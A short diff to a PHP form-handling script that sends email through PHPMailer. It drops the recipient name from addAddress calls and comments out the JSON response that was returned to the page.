@@ -33,7 +33,7 @@ $rec_email = trim($_POST['rec_email']);
 
         //Recipients
         $mail->setFrom('taadewusi4u@gmail.com', 'Tee');
-        $mail->addAddress($email, $first_name);     //Add a recipient
+        $mail->addAddress($email);     //Add a recipient
         $mail->addAddress($email);               //Name is optional
         $mail->addReplyTo('info@example.com', 'Information');
         //  $mail->addCC('cc@example.com');
@@ -72,7 +72,7 @@ else if($email != null && $password != null){
 
     //Recipients
     $mail->setFrom('taadewusi4u@gmail.com', 'Tee');
-    $mail->addAddress($email, $first_name);     //Add a recipient
+    $mail->addAddress($email);     //Add a recipient
     $mail->addAddress($email);               //Name is optional
     $mail->addReplyTo('info@example.com', 'Information');
     //  $mail->addCC('cc@example.com');
@@ -95,12 +95,13 @@ else{
 	$signal = 'bad';
 	$msg = 'Please fill in all the fields.';
 }
-$data = array(
-        'signal' => $signal,
-        'msg' => $msg,
-        'redirect_link' => $redirect,
-    );
-    echo json_encode($data);
+
+   // $data = array(
+    //    'signal' => $signal,
+   //     'msg' => $msg,
+   //     'redirect_link' => $redirect,
+  //  );
+  //  echo json_encode($data);
 }
 
 ?>
